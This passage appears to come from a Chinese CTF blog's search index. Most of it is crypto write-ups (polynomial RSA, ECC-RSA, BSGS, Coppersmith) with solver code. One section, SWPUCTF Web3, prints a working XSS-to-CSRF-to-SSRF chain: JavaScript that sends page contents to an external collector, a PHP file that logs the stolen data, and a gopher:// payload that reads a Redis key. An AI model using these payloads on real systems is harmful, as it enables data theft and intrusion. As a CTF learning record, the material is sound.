phi(q)=(43753112−1)phi(q) = (43753^{112} - 1)phi(q)=(43753112−1) phi(n)=phi(p)∗phi(q)=(4375365−1)∗(43753112−1)phi(n) = phi(p)*phi(q) = (43753^{65} - 1)*(43753^{112} - 1)phi(n)=phi(p)∗phi(q)=(4375365−1)∗(43753112−1) 值得一提的是，解出的明文以多项式的形式给出 1125*y^62 + 111*y^61 + 114*y^60 + 117*y^59 + 53*y^58 + 51*y^57 + 51*y^56 + 100*y^55 + 106*y^54 + 110*y^53 + 102*y^52 + 106*y^51 + 100*y^50 + 104*y^49 + 101*y^48 + 117*y^47 + 52*y^46 + 52*y^45 + 57*y^44 + 48*y^43 + 50*y^42 + 107*y^41 + 35*y^40 + 101*y^39 + 114*y^38 + 117*y^37 + 99*y^36 + 101*y^35 + 115*y^34 + 110*y^33 + 105*y^32 + 95*y^31 + 116*y^30 + 117*y^29 + 98*y^28 + 95*y^27 + 110*y^26 + 117*y^25 + 102*y^24 + 95*y^23 + 115*y^22 + 105*y^21 + 95*y^20 + 97*y^19 + 101*y^18 + 107*y^17 + 105*y^16 + 95*y^15 + 109*y^14 + 111*y^13 + 114*y^12 + 102*y^11 + 95*y^10 + 65*y^9 + 83*y^8 + 82*y^7 + 123*y^6 + 114*y^5 + 118*y^4 + 101*y^3 + 116*y^2 + 97*y + 119 幂代表位数，系数即为flag的内容 Code 123456789101112R.&lt;y&gt; = PolynomialRing(GF(43753))n = R(&quot;34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814&quot;)c = R(&quot;5209*y^176 + 10881*y^175 + 31096*y^174 + 23354*y^173 + 28337*y^172 + 15982*y^171 + 13515*y^170 + 21641*y^169 + 10254*y^168 + 34588*y^167 + 27434*y^166 + 29552*y^165 + 7105*y^164 + 22604*y^163 + 41253*y^162 + 42675*y^161 + 21153*y^160 + 32838*y^159 + 34391*y^158 + 832*y^157 + 720*y^156 + 22883*y^155 + 19236*y^154 + 33772*y^153 + 5020*y^152 + 17943*y^151 + 26967*y^150 + 30847*y^149 + 10306*y^148 + 33966*y^147 + 43255*y^146 + 20342*y^145 + 4474*y^144 + 3490*y^143 + 38033*y^142 + 11224*y^141 + 30565*y^140 + 31967*y^139 + 32382*y^138 + 9759*y^137 + 1030*y^136 + 32122*y^135 + 42614*y^134 + 14280*y^133 + 16533*y^132 + 32676*y^131 + 43070*y^130 + 36009*y^129 + 28497*y^128 + 2940*y^127 + 9747*y^126 + 22758*y^125 + 16615*y^124 + 14086*y^123 + 13038*y^122 + 39603*y^121 + 36260*y^120 + 32502*y^119 + 17619*y^118 + 17700*y^117 + 15083*y^116 + 11311*y^115 + 36496*y^114 + 1300*y^113 + 13601*y^112 + 43425*y^111 + 10376*y^110 + 11551*y^109 + 13684*y^108 + 14955*y^107 + 6661*y^106 + 12674*y^105 + 21534*y^104 + 32132*y^103 + 34135*y^102 + 43684*y^101 + 837*y^100 + 29311*y^99 + 4849*y^98 + 26632*y^97 + 26662*y^96 + 10159*y^95 + 32657*y^94 + 12149*y^93 + 17858*y^92 + 35805*y^91 + 19391*y^90 + 30884*y^89 + 42039*y^88 + 17292*y^87 + 4694*y^86 + 1497*y^85 + 1744*y^84 + 31071*y^83 + 26246*y^82 + 24402*y^81 + 22068*y^80 + 39263*y^79 + 23703*y^78 + 21484*y^77 + 12241*y^76 + 28821*y^75 + 32886*y^74 + 43075*y^73 + 35741*y^72 + 19936*y^71 + 37219*y^70 + 33411*y^69 + 8301*y^68 + 12949*y^67 + 28611*y^66 + 42654*y^65 + 6910*y^64 + 18523*y^63 + 31144*y^62 + 21398*y^61 + 36298*y^60 + 27158*y^59 + 918*y^58 + 38601*y^57 + 4269*y^56 + 5699*y^55 + 36444*y^54 + 34791*y^53 + 37978*y^52 + 32481*y^51 + 8039*y^50 + 11012*y^49 + 11454*y^48 + 30450*y^47 + 1381*y^46 + 32403*y^45 + 8202*y^44 + 8404*y^43 + 37648*y^42 + 43696*y^41 + 34237*y^40 + 36490*y^39 + 41423*y^38 + 35792*y^37 + 36950*y^36 + 31086*y^35 + 38970*y^34 + 12439*y^33 + 7963*y^32 + 16150*y^31 + 11382*y^30 + 3038*y^29 + 20157*y^28 + 23531*y^27 + 32866*y^26 + 5428*y^25 + 21132*y^24 + 13443*y^23 + 28909*y^22 + 42716*y^21 + 6567*y^20 + 24744*y^19 + 8727*y^18 + 14895*y^17 + 28172*y^16 + 30903*y^15 + 26608*y^14 + 27314*y^13 + 42224*y^12 + 42551*y^11 + 37726*y^10 + 11203*y^9 + 36816*y^8 + 5537*y^7 + 20301*y^6 + 17591*y^5 + 41279*y^4 + 7999*y^3 + 33753*y^2 + 34551*y + 9659&quot;)#print(factor(n))import gmpy2f = 43753e = 65537phi = (f**65 - 1)*(f**112 - 1)d = gmpy2.invert(e, phi)m = pow(c, Integer(d), n)for i in range(63): print(chr(m[i]), end=&#x27;&#x27;) [watevrCTF 2019]ECC-RSA 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from fastecdsa.curve import P521 as Curvefrom fastecdsa.point import Pointfrom Crypto.Util.number import bytes_to_long, isPrimefrom os import urandomfrom random import getrandbits def gen_rsa_primes(G): urand = bytes_to_long(urandom(521//8)) while True: s = getrandbits(521) ^ urand Q = s*G if isPrime(Q.x) and isPrime(Q.y): print(&quot;ECC Private key:&quot;, hex(s)) print(&quot;RSA primes:&quot;, hex(Q.x), hex(Q.y)) print(&quot;Modulo:&quot;, hex(Q.x * Q.y)) return (Q.x, Q.y) flag = int.from_bytes(input(), byteorder=&quot;big&quot;) ecc_p = Curve.pa = Curve.ab = Curve.b Gx = Curve.gxGy = Curve.gyG = Point(Gx, Gy, curve=Curve) e = 0x10001p, q = gen_rsa_primes(G)n = p*q file_out = open(&quot;downloads/ecc-rsa.txt&quot;, &quot;w&quot;) file_out.write(&quot;ECC Curve Prime: &quot; + hex(ecc_p) + &quot;\\n&quot;)file_out.write(&quot;Curve a: &quot; + hex(a) + &quot;\\n&quot;)file_out.write(&quot;Curve b: &quot; + hex(b) + &quot;\\n&quot;)file_out.write(&quot;Gx: &quot; + hex(Gx) + &quot;\\n&quot;)file_out.write(&quot;Gy: &quot; + hex(Gy) + &quot;\\n&quot;) file_out.write(&quot;e: &quot; + hex(e) + &quot;\\n&quot;)file_out.write(&quot;p * q: &quot; + hex(n) + &quot;\\n&quot;) c = pow(flag, e, n)file_out.write(&quot;ciphertext: &quot; + hex(c) + &quot;\\n&quot;) ECC y2≡x3+a∗x+bmod ecc_primey^{2} ≡ x^{3} + a*x + b \\mod ecc\\_primey2≡x3+a∗x+bmodecc_prime 这里p对应x，q对应y q2≡p3+a∗p+bmod ecc_primeq^{2} ≡ p^{3} + a*p + b \\mod ecc\\_primeq2≡p3+a∗p+bmodecc_prime p2∗q2≡(p3+a∗p+b)∗p2mod ecc_primep^{2} * q^{2} ≡ (p^{3} + a*p + b) * p^{2} \\mod ecc\\_primep2∗q2≡(p3+a∗p+b)∗p2modecc_prime n2≡(p3+a∗p+b)∗p2mod ecc_primen^{2} ≡ (p^{3} + a*p + b) * p^{2} \\mod ecc\\_primen2≡(p3+a∗p+b)∗p2modecc_prime 0≡(p3+a∗p+b)∗p2−n2mod ecc_prime0 ≡ (p^{3} + a*p + b) * p^{2} - n^{2} \\mod ecc\\_prime0≡(p3+a∗p+b)∗p2−n2modecc_prime 解出p之后就是基操 Code 123456789101112131415161718192021ep = 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa = -0x3b = 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00Gx = 0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66Gy = 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650e = 0x10001n = 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28fc = 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9eimport gmpy2from Crypto.Util.number import *F.&lt;x&gt; = Zmod(ep)[]f = (x**3 + a * x + b)*(x**2) - n**2pset = f.roots()for _ in pset: p = Integer(_[0]) q = n // p phi = (p - 1)*(q - 1) d = gmpy2.invert(gmpy2.mpz(e), gmpy2.mpz(phi)) m = pow(c, d, n) print(long_to_bytes(m))","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"}]},{"title":"使用FRP进行三层靶场渗透测试","slug":"Pentest-With-FRP","date":"2021-01-17T15:28:16.000Z","updated":"2021-01-17T15:31:53.000Z","comments":true,"path":"2021/01/17/Pentest-With-FRP/","link":"","permalink":"https://yoloyolo.top/2021/01/17/Pentest-With-FRP/","excerpt":"","text":"https://shimo.im/docs/DkCc3GKPygyGr6vV","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"}]},{"title":"BSGS","slug":"BSGS","date":"2021-01-16T16:17:37.000Z","updated":"2022-06-27T18:40:39.000Z","comments":true,"path":"2021/01/16/BSGS/","link":"","permalink":"https://yoloyolo.top/2021/01/16/BSGS/","excerpt":"Baby Step Giant Step – 小步大步算法","text":"Baby Step Giant Step – 小步大步算法 用于求解形如 ax≡bmod na^x ≡ b \\mod nax≡bmodn 的问题(gcd(a,n)=1,x&lt;ngcd(a, n) = 1, x &lt; ngcd(a,n)=1,x&lt;n) 将x转为 i∗m−ji*m - ji∗m−j 的形式 ax≡bmod na^x ≡ b \\mod nax≡bmodn a(i∗m−j)≡bmod na^{(i*m - j)} ≡ b \\mod na(i∗m−j)≡bmodn a(i∗m)≡b∗ajmod na^{(i*m)} ≡ b*a^j \\mod na(i∗m)≡b∗ajmodn 对于右边，j遍历[0, m-1]，计算结果进行存储 对于左边，i遍历[0, nm\\frac{n}{m}mn​]，计算结果在右边的存储中进行搜索 计算时间复杂度为O(nm+m\\frac{n}{m}+mmn​+m) 当nm=m\\frac{n}{m} = mmn​=m时 即m=nm = \\sqrt{n}m=n​时 计算时间复杂度最小，为O(2n2\\sqrt{n}2n​) 例如：[网鼎杯2020青龙组] you_raise_me_up m, c, n已知来求flag 12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#x27;m = &#x27; + str(m)print &#x27;c = &#x27; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499 sage中可使用的离散对数求解函数： discrete_log discrete_log_rho discrete_log_lambda bsgs 但是这里使用bsgs会直接使python执行进程退出，只能使用discrete_log 12345n = 2 ** 512m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499flag = discrete_log(c, mod(m,n))print(long_to_bytes(flag)) 而之前的digits_missing中只能使用bsgs，使用discrete_log的效率太低 12345678p = 8652390958861741435444627047576503554063739935043923776101303146382894597047179400211376204501335462644199685775560596374016398617315983998885273252232383q = 11398271496284943396462023942239673376393494680988625153067750611899511451472208462647358820098737289431021205366418955146690406049973272066743297095335701n = p * qm = 119734924542618020546820838777476635357941645923563189966789686819064058863592c = 56409941327407928550531590953236316964802997285515886345082618240072551829663483576336544664403443682438280485868042844696756568731554243773790500024504963753053241086872006291605136092928526547169334420024477141471212559780737725850766070778466019859345735742281733141983853509548060639633435609434590536531F = IntegerModRing(n)flag = bsgs(F(m), F(c), (0, 2**32))print(flag) 查阅相关资料之后再，对比来看： bsgs算法虽然时间复杂度为O(2n2\\sqrt{n}2n​)，但是可以借助已知条件来限定flag值的范围，从而极大地提高了该函数的效率 而discrete_log函数基于的算法为：Pohlig-Hellman and Baby step giant step. Pohlig-Hellman算法与(n-1)的因数分解相关，对于易分解的(n-1)，使用该函数的效果更佳 另外也有扩展BSGS的情况(gcd(a,n)&gt;1gcd(a, n) &gt; 1gcd(a,n)&gt;1) 相关资料： Sage官方文档： https://doc.sagemath.org/html/en/reference/groups/sage/groups/generic.html 离散对数求解： https://blog.csdn.net/qq_41956187/article/details/104981499 CTFWiki–离散对数： https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm sage之离散对数求解： https://blog.csdn.net/ckm1607011/article/details/106849551/ Pollard_Rho： https://xz.aliyun.com/t/2780?spm=5176.12901015.0.i12901015.10da525cYMMryY BSGS与扩展BSGS： https://blog.csdn.net/weixin_30701521/article/details/95145298","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"BSGS","slug":"BSGS","permalink":"https://yoloyolo.top/tags/BSGS/"},{"name":"discrete_log","slug":"discrete-log","permalink":"https://yoloyolo.top/tags/discrete-log/"}]},{"title":"纵横杯 -- digits_missing","slug":"Crypto-digits-missing","date":"2021-01-15T13:03:36.000Z","updated":"2022-06-27T18:40:16.000Z","comments":true,"path":"2021/01/15/Crypto-digits-missing/","link":"","permalink":"https://yoloyolo.top/2021/01/15/Crypto-digits-missing/","excerpt":"学！","text":"学！ 1234567891011121314151617181920212223242526272829303132333435363738from gmpy2 import *from Crypto.Util.number import *from random import getrandbitsimport uuid flag = &#x27;flag&#123;&#x27; + str(uuid.uuid4()) + &#x27;&#125;&#x27;flag = flag.encode().strip(b&#x27;flag&#123;&#x27;).strip(b&#x27;&#125;&#x27;).split(b&#x27;-&#x27;)padding = long_to_bytes(getrandbits(512)) m = bytes_to_long(flag[0] + padding + b&#x27;&#x27;.join([_ for _ in flag[1:]])) def leak(a, b, c): e1, e2 = a &gt;&gt; 32, a &amp; 2 ** 32 - 1 m1, m2 = b &gt;&gt; 256, b &amp; 2 ** 256 - 1 p, q = getPrime(512), getPrime(512) e = getPrime(32) n = p * q d = invert(e, (p - 1) * (q - 1)) c1 = pow(b, e, n) c2 = pow((m1 + m2), (e1 + e2), n) c3 = pow(a, a, n) c4 = pow(c, 0x10001, n) return (p, q, d % (p-1), d % (q-1), c1, c2, c3, c4) def enc(m): p = getPrime(512) q = getPrime(512) e = 5 n = p * q c = pow(m, e, n) return (c, n) l = leak(bytes_to_long(flag[0]), bytes_to_long(padding), bytes_to_long(flag[1] + flag[2]))c, n = enc(m)print(l)print(n)print(c) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990p = 8652390958861741435444627047576503554063739935043923776101303146382894597047179400211376204501335462644199685775560596374016398617315983998885273252232383q = 11398271496284943396462023942239673376393494680988625153067750611899511451472208462647358820098737289431021205366418955146690406049973272066743297095335701dp = 8227609008398873022400100032341316575069340356351334917468390748158625965488292971381161571649777894379178019250723450517822383161853535988801155974245829dq = 617211540838331845453037224433458963099456992985736058430698238900631773989787292432368601561591831465287703203840756371539826467039309120629989472610731n = 117748526248625603136351142766702204100236020660530366220791523773556022688543102946994917484678907692740314580746055286084348066502206905265752560353316613182375867778005737716910384438378102771898539357644605407585140993539708961209892736485222242671952840176226813623119643604701373240666050114195876590147c = 11808273710504985443774404922628957257282747551484241545715693957153834727214995382868148041169819735282602593341730142167762213843046458242397247585755571045197205530638559439590698610690145211653032525642896154923181980344419031242307181446338164880957117881613097177678720633802107664174510977184795898949c1 = 47136490736007026558241813301582050934441405175571329460613503012332065445341605765747908505286660131226561805265807633529290854688982152443879376327826248561833249864461425952747897175255546352471407983593816589373742238086560879516048675503364687914498582870324744857141831219402137460273880044886984405452c2 = 56409941327407928550531590953236316964802997285515886345082618240072551829663483576336544664403443682438280485868042844696756568731554243773790500024504963753053241086872006291605136092928526547169334420024477141471212559780737725850766070778466019859345735742281733141983853509548060639633435609434590536531c3 = 65058860021739531727088022149052143280404687999094594643616981645096271253997738526846930648540908395636973922952920134720525905860923697049859869913222811090573640409885098897352875692221136178538186740234898374169996494317972403060810936762924806513049343486713829518722226110983873658650785406820898700651c4 = 32982466289233591258768165759927834475634992737248170434422994518702136286193176584067227438086450612500847996564720817106569494236142428184048889837042556370038553603123311299352611462708505050577773451291827498889210800170157619474074829930128950482157454573988753054631832302454833608646278214673705352226 import gmpy2from Crypto.Util.number import * #flag[1]+flag[2]，根据p,q,e来算出dn1 = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(0x10001, phi)flag12 = pow(c4, d, n1)print(&quot;flag12 : &#123;&#125;&quot;.format(long_to_bytes(flag12))) #padding，dp,dq求mmp = Integer(pow(c1, dp, p))mq = Integer(pow(c1, dq, q))p_ = gmpy2.invert(p, q)padding = ((((mq - mp) * p_) % q) * p + mp) % n1print(&quot;padding : &#123;&#125;&quot;.format(padding)) #flag[0]，两种解法m1m2 = (padding &gt;&gt; 256) + (padding &amp; 2 ** 256 - 1)charset = &#x27;abcdef0123456789&#x27; ##中间相遇，将加密过程理解为((m ** e2) * (m ** e1)) % n1mid = &#123;&#125;for i in charset: for j in charset: for k in charset: for l in charset: e1 = bytes_to_long((i+j+k+l).encode()) e1_ = gmpy2.invert(gmpy2.mpz(pow(m1m2, e1, n1)), n1) tmp = ((c2 * e1_) % n1) mid[tmp] = e1for i in charset: for j in charset: for k in charset: for l in charset: e2 = bytes_to_long((i+j+k+l).encode()) tmp = pow(m1m2, e2, n1) if tmp in mid: e1 = mid[tmp] a = (e1 &lt;&lt; 32) + e2 if pow(a, a, n1) == c3: flag0 = aprint(&quot;flag0 : &#123;&#125;&quot;.format(long_to_bytes(flag0))) ##BSGS(sage)，算出e1+e2再单独爆破e2即可得到e1F = IntegerModRing(p*q)mm = F(m1m2)c2 = F(c2)e12 = bsgs(mm, c2, (0, 2**32))for i in charset: for j in charset: for k in charset: for l in charset: e2 = bytes_to_long((i+j+k+l).encode()) e1 = (e12 - e2) &lt;&lt; 32 a = e1 + e2 if pow(a,a,n1) == c3: flag0 = aprint(&quot;flag0 : &#123;&#125;&quot;.format(long_to_bytes(flag0))) #flag，coppersmith m已知高位m_high = bytes_to_long(b&#x27;9aa74d6f&#x27; + long_to_bytes(padding) + b&#x27;bb6b431b&#x27;)e = 5F.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m_high * (2**128) + x) ** e - croots = f.small_roots(epsilon=1/25)[0]m = long_to_bytes(m_high * (2**128) + roots)print(b&#x27;flag&#123;&#x27; + m[:8] + b&#x27;-&#x27; + m[-24:-20] + b&#x27;-&#x27; + m[-20:-16] + b&#x27;-&#x27; + m[-16:-12] + b&#x27;-&#x27; + m[-12:] + b&#x27;&#125;&#x27;)######kbits = 14 * 8for i in charset: for j in charset: tmp = bytes_to_long(b&#x27;9aa74d6f&#x27; + long_to_bytes(padding) + b&#x27;bb6b431b&#x27; + i.encode() + j.encode()) f = (tmp * (2**kbits) + x) ** e - c roots = f.small_roots(X=2**kbits, beta=1) if roots: x0 = roots[0] m = long_to_bytes(tmp * (2**kbits) + x0) print(b&#x27;flag&#123;&#x27; + m[:8] + b&#x27;-&#x27; + m[-24:-20] + b&#x27;-&#x27; + m[-20:-16] + b&#x27;-&#x27; + m[-16:-12] + b&#x27;-&#x27; + m[-12:] + b&#x27;&#125;&#x27;) 最后coppersmith部分的求根代码还没有完全理解 第一种方法是直接设置参数epsilon就可以直接求解 第二种方法设置beta，但是需要再爆破两位明文","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"https://yoloyolo.top/tags/Coppersmith/"}]},{"title":"SWPUCTF -- Web3","slug":"SWPUCTF-Web3","date":"2021-01-14T13:25:50.000Z","updated":"2022-06-14T12:20:46.000Z","comments":true,"path":"2021/01/14/SWPUCTF-Web3/","link":"","permalink":"https://yoloyolo.top/2021/01/14/SWPUCTF-Web3/","excerpt":"对着WriteUp复盘还是遇到了不少问题，也学到了很多Trick","text":"对着WriteUp复盘还是遇到了不少问题，也学到了很多Trick XSS 注册用户名处可以构造XSS，那么我们可以使用这个XSS来引用外部的js文件 1&lt;script src=https://yoloyolo.top/1.js&gt;&lt;/script&gt; Payload1如下 12345//Payload1 For XSSvar source = document.documentElement.outerHTML;txt = escape(source);var newimg = new Image();newimg.src=&quot;https://yoloyolo.top/1.php?key=&quot;+&quot;\\n&quot;+txt+&quot;\\n&quot;; 1234&lt;?php$file = &quot;new&quot;;file_put_contents($file,$_REQUEST[&#x27;key&#x27;],FILE_APPEND);?&gt; 由于这里被设置了HTTPOnly，不能使用XSS来盗取Cookie，只能先获取admin后台页面的内容 根据内容再进行后续的操作 返回的HTML源码中可以看到以下内容 1&lt;form action=&quot;./ssrf_for_test.php&quot; method=&quot;GET&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;Input url...&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;%u83B7%u53D6%u8D44%u6E90&quot;&gt;&lt;/form&gt; 普通用户去访问./ssrf_for_test.php则会提示权限不足 但是可以使用XSS来进一步构造CSRF，去读取php的显示内容 CSRF 这里我们直接更改1.js的内容 123456//Payload2 For XSS+CSRFvar httpreq1 = new XMLHttpRequest();httpreq1.open(&#x27;GET&#x27;,&#x27;http://192.168.56.103:40090/ssrf_for_test.php&#x27;,false);httpreq1.send();var img = new Image();img.src = &quot;https://yoloyolo.top/1.php?key=&quot;+&quot;\\n&quot;+escape(httpreq1.responseText); 直接构造XMLHttpRequest请求来读取php的显示内容 得到的结果为 只允许http|https|gopher协议 结合题目所给出的提示，flag在redis中，那么可以利用CSRF来进行SSRF SSRF 12345678//Payload3 For XSS+CSRF+SSRFvar httpreq2 = new XMLHttpRequest();httpreq2.open(&#x27;GET&#x27;,&#x27;http://192.168.56.103:40090/ssrf_for_test.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%247%250d%250aCOMMAND%250d%250a*2%250d%250a%243%250d%250aget%250d%250a%244%250d%250aflag%250d%250aquit&#x27;,false);httpreq2.send();var httpreq3 = new XMLHttpRequest();httpreq3.open(&#x27;POST&#x27;,&#x27;https://yoloyolo.top/1.php&#x27;,false);httpreq3.setRequestHeader (&#x27;Content-type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);httpreq3.send(&quot;key=&quot;+escape(httpreq2.responseText)); 先构造SSRF，从redis中读取flag，再将读取到的内容用POST的方法发送到用于接收的php 流量部分可以用Wireshark抓包来观察，得到的结果为 12345678*1$7COMMAND*2$3get$4flag 但是后面必须加一个quit，否则会一直与redis连接，无法得到回显结果 这个quit在对redis抓包时并没有看到，而且在redis客户端中使用quit和exit都可以退出，但是在使用gopher协议时只有quit生效 放在js中的时候必须进行双重URL编码，否则无效 这里如果还是使用img标签来用GET方法传递参数的话，则会出现 HTTP 414 Request-URI Too Long 的错误，所以只能POST的方法 但是使用XMLHttpRequest请求去访问跨域资源时(CORS)，会因为浏览器的同源策略造成一些影响，可能就不会去加载资源，但是对获取flag没有影响 不过在查阅一些资料之后理清楚了过程 客户端带着redis打出来的数据对远程服务端进行跨域请求 远程服务端响应包的头部没有设置 Access-Control-Allow-Origin 客户端禁止载入远程客户端的资源 不过在第一步时，由于带着数据进行请求了，那么php自然就把数据写入文件中了 这个问题可以在apache的配置文件中添加Access-Control-Allow-Origin来进行解决，但是对于本题来说有点画蛇添足 一篇题目相似的WP XSS的威力：从XSS到SSRF再到Redis","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://yoloyolo.top/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://yoloyolo.top/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://yoloyolo.top/tags/SSRF/"}]},{"title":"SWPUCTF -- Crypto","slug":"SWPUCTF-Crypto","date":"2021-01-14T13:17:44.000Z","updated":"2022-06-27T18:22:59.000Z","comments":true,"path":"2021/01/14/SWPUCTF-Crypto/","link":"","permalink":"https://yoloyolo.top/2021/01/14/SWPUCTF-Crypto/","excerpt":"Web狗做不来Misc所以把Crypto给AK了","text":"Web狗做不来Misc所以把Crypto给AK了 happy 一开始题目上错附件浪费快两个小时，有点无语 1234(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)#q + q*p^3 = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594 a=q+q∗p3a = q+q*p^3a=q+q∗p3 b=q∗p+q∗p2b = q*p+q*p^2b=q∗p+q∗p2 x=gcd(a,b)x = gcd(a,b)x=gcd(a,b) ab=q+q∗p3q∗p+q∗p2=1+p3p+p2=a/xb/x\\frac{a}{b} = \\frac{q+q*p^3}{q*p+q*p^2} = \\frac{1+p^3}{p+p^2} = \\frac{a/x}{b/x}ba​=q∗p+q∗p2q+q∗p3​=p+p21+p3​=b/xa/x​ 因式分解 